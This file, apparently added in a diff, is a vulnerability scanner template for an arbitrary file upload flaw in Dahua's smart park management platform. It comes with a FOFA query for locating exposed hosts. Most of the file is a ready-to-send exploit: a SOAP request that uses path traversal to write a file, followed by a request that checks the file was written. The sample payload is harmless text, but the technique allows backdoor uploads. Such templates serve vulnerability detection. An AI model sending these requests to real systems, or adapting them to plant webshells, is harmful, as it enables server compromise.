@@ -1,0 +1,46 @@
+## id: VEID-2024-0209
+## name: 大华智慧园区综合管理平台bitmap接口存在任意文件上传漏洞
+## author: hack007x
+## severity: critical
+## tags: veid,tce,veid2024
+## description:大华园区综合管理平台/emap/webservice/gis/soap/bitmap接口处存在任意文件上传漏洞，恶意攻击者可能会上传后门文件，造成服务器失陷
+## fofa-query: app="dahua-智慧园区综合管理平台"
+## verification: true
+
+
+POST /emap/webservice/gis/soap/bitmap HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+Content-Type: text/xml; charset=utf-8
+
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:res="http://response.webservice.bitmap.mapbiz.emap.dahuatech.com/">
+    <soapenv:Header/>           
+	    <soapenv:Body>
+     		    <res:uploadPicFile>
+                    <arg0>
+             	    <picPath>/../a.txt</picPath>
+                    </arg0>
+                    <arg1>aGVsbG8gdmVpbA==</arg1>
+                </res:uploadPicFile>
+		</soapenv:Body>
+</soapenv:Envelope>
+
+#@ condition: and
+#@ matcher: status_code == 200
+
+
+---
+
+GET /upload/a.txt HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+
+#@ condition: and
+#@ matcher: status_code == 200
+#@ matcher: body contains "hello veil"
+
+
+
+
+
+# @VEIL-STAMP: a26cbba05f575ce836b719b325b792d2af2f11af9a8cb7de32aef2fd0f6d8dd3
